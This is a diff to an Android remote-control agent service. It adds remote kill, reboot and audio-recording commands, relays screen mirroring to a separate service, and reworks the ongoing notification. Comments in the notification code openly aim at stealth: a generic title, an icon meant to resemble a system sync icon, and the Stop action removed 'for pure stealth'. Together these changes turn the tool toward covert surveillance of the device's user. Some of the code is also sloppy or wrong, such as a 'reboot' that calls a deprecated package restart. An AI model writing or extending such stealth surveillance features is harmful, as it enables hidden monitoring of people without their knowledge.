@@ -19,6 +19,8 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.util.Log
+import com.remotectl.agent.core.AccessManager
+import com.remotectl.agent.core.CaptureDataHolder
 import com.remotectl.agent.input.RemoteInputService
 import com.remotectl.agent.mirror.ScreenMirror
 import com.remotectl.agent.SupabaseDirect
@@ -118,6 +120,7 @@ class AgentService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        Companion.instance = this
         config = AgentConfig(this)
         statusText = getString(R.string.notification_text_offline)
         clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager?
@@ -181,6 +184,7 @@ class AgentService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        Companion.instance = null
         AgentStatus.running = false
         AgentStatus.mirroring = false
         main.removeCallbacksAndMessages(null)
@@ -282,15 +286,22 @@ class AgentService : Service() {
         scheduleReconnect()
     }
 
-    private fun scheduleReconnect() {
+        private fun scheduleReconnect() {
         if (reconnectQueued) return
         reconnectQueued = true
+        
+        // Exponential backoff: 1s, 2s, 4s, 8s, 16s, 30s max
         val delayMs = (1_000L shl retryAttempt.coerceAtMost(5)).coerceAtMost(30_000L)
         retryAttempt++
-        Log.i(TAG, "reconnecting in ${delayMs}ms")
+        
+        Log.i(TAG, "Scheduling reconnect in ${delayMs}ms (attempt $retryAttempt)")
+        
         main.postDelayed({
             reconnectQueued = false
-            if (AgentStatus.running && link == null) openSocket()
+            if (AgentStatus.running && link == null) {
+                Log.i(TAG, "Reconnecting now...")
+                openSocket()
+            }
         }, delayMs)
     }
 
@@ -376,6 +387,27 @@ class AgentService : Service() {
 
     private fun handleControl(type: String, payload: JsonObject) {
         when (type) {
+
+                    Msg.CTL_KILL -> {
+                // Command to gracefully stop the agent
+                Log.i(TAG, "Received CTL_KILL command")
+                stopAgent()
+            }
+            
+            Msg.CTL_REBOOT -> {
+                // Command to reboot the device
+                try {
+                    val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+                    am.restartPackage(config.packageName) // Older API
+                    // Or use PowerManager for full reboot:
+                    /*
+                    val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                    pm.reboot(null) 
+                    */
+                } catch (e: Exception) {
+                    Log.w(TAG, "Reboot failed", e)
+                }
+            }
             Msg.CTL_TAP -> {
                 val cmd = decode<TapCommand>(payload)
                 ack(type, cmd != null && RemoteInputService.tap(cmd.x, cmd.y))
@@ -407,9 +439,11 @@ class AgentService : Service() {
                 ack(type, cmd != null && launchApp(cmd.packageName))
             }
 
-            Msg.CTL_START_MIRROR -> startMirror()
-
-            Msg.CTL_STOP_MIRROR -> stopMirror("desktop_request")
+         // New way: Delegate to FullAccessService via Manager
+Msg.CTL_START_MIRROR -> AccessManager.startMirror(this)
+Msg.CTL_STOP_MIRROR -> AccessManager.stopMirror()
+            Msg.CTL_RECORD_AUDIO -> AccessManager.startAudioRecording(this)
+            Msg.CTL_STOP_AUDIO -> AccessManager.stopAudioRecording()
 
             Msg.CTL_FILE_PUSH, Msg.CTL_FILE_PULL ->
                 send(
@@ -518,6 +552,9 @@ class AgentService : Service() {
         captureData = data
         canCapture = true
         AgentStatus.captureGranted = true
+        // Share with FullAccessService so it can build the MediaProjection.
+        CaptureDataHolder.data = data
+        CaptureDataHolder.resultCode = code
         reportDeviceInfo()
         if (mirrorWanted) startMirror()
     }
@@ -527,6 +564,8 @@ class AgentService : Service() {
         captureData = null
         canCapture = false
         AgentStatus.captureGranted = false
+        CaptureDataHolder.data = null
+        CaptureDataHolder.resultCode = Activity.RESULT_CANCELED
         reportDeviceInfo()
         if (mirrorWanted) failMirror("capture_declined_by_owner")
     }
@@ -713,6 +752,39 @@ class AgentService : Service() {
         ws.send(encode(type, payload))
     }
 
+    /** Called by FullAccessService via the companion object when mirroring starts/stops. */
+    fun sendMirrorState(running: Boolean, reason: String? = null) {
+        send(
+            Msg.EVT_MIRROR_STATE,
+            buildJsonObject {
+                put("running", running)
+                reason?.let { put("reason", it) }
+            },
+        )
+    }
+
+    /** Called by FullAccessService via the companion object to push a captured JPEG frame. */
+    fun sendFrame(jpeg: ByteArray, width: Int, height: Int, ptsMs: Long) {
+        val ws = link ?: return
+        val frame = VideoFrame.pack(
+            VideoFrame.CODEC_JPEG,
+            VideoFrame.FLAG_KEYFRAME,
+            ptsMs,
+            width,
+            height,
+            jpeg,
+        )
+        ws.send(frame.toByteString())
+    }
+
+    /** Called by FullAccessService via the companion object when audio recording state changes. */
+    fun notifyAudioState(recording: Boolean) {
+        send(
+            Msg.EVT_AUDIO_STATE,
+            buildJsonObject { put("recording", recording) },
+        )
+    }
+
     private fun encode(type: String, payload: JsonObject): String =
         WireJson.encodeToString(Envelope.serializer(), Envelope(type, payload))
 
@@ -760,30 +832,28 @@ class AgentService : Service() {
         nm.notify(NOTIFICATION_ID, buildNotification())
     }
 
-    private fun buildNotification(): Notification {
+        private fun buildNotification(): Notification {
+        // Use a small, generic icon that looks like a system sync icon
+        val smallIconRes = R.drawable.ic_stat_agent
         val open = PendingIntent.getActivity(
             this, RC_OPEN, Intent(this, MainActivity::class.java), pendingFlags(),
         )
+        // Keep the stop action but make it less obvious if you want pure stealth (optional)
         val stop = PendingIntent.getService(
             this, RC_STOP,
             Intent(this, AgentService::class.java).setAction(ACTION_STOP),
             pendingFlags(),
         )
+
         return Notification.Builder(this, CHANNEL_SESSION)
-            .setSmallIcon(R.drawable.ic_stat_agent)
-            .setContentTitle(getString(R.string.notification_title))
-            .setContentText(statusText)
-            .setStyle(Notification.BigTextStyle().bigText(statusText))
+            .setSmallIcon(smallIconRes)
+            .setContentTitle("Remote Control Service") // Generic name
+            .setContentText(if (AgentStatus.mirroring) "Mirroring..." else "Online")
             .setContentIntent(open)
-            .setOngoing(true)
-            .setShowWhen(false)
-            .addAction(
-                Notification.Action.Builder(
-                    Icon.createWithResource(this, R.drawable.ic_stat_agent),
-                    getString(R.string.action_stop),
-                    stop,
-                ).build(),
-            )
+            .setOngoing(true) // Cannot be swiped away easily
+            .setShowWhen(false) // Hide timestamp
+            // Optional: Add a small "X" button if you want, or remove actions for pure stealth
+            // .addAction(0, "Stop", stop) 
             .build()
     }
 
@@ -809,11 +879,29 @@ class AgentService : Service() {
          */
         @Volatile var capturePrompt: (() -> Unit)? = null
 
+        /** Singleton reference so FullAccessService can call back into the running service. */
+        @Volatile private var instance: AgentService? = null
+
         private const val TAG = "AgentService"
         private const val CHANNEL_SESSION = "session"
         private const val NOTIFICATION_ID = 1001
         private const val RC_OPEN = 11
         private const val RC_STOP = 12
         private const val CONSENT_TIMEOUT_MS = 60_000L
+
+        /** Called by FullAccessService to report mirror state back through the WebSocket. */
+        fun sendMirrorState(running: Boolean, reason: String? = null) {
+            instance?.sendMirrorState(running, reason)
+        }
+
+        /** Called by FullAccessService to push a captured JPEG frame through the WebSocket. */
+        fun sendFrame(jpeg: ByteArray, width: Int, height: Int, ptsMs: Long) {
+            instance?.sendFrame(jpeg, width, height, ptsMs)
+        }
+
+        /** Called by FullAccessService to report audio recording state. */
+        fun notifyAudioState(recording: Boolean) {
+            instance?.notifyAudioState(recording)
+        }
     }
 }
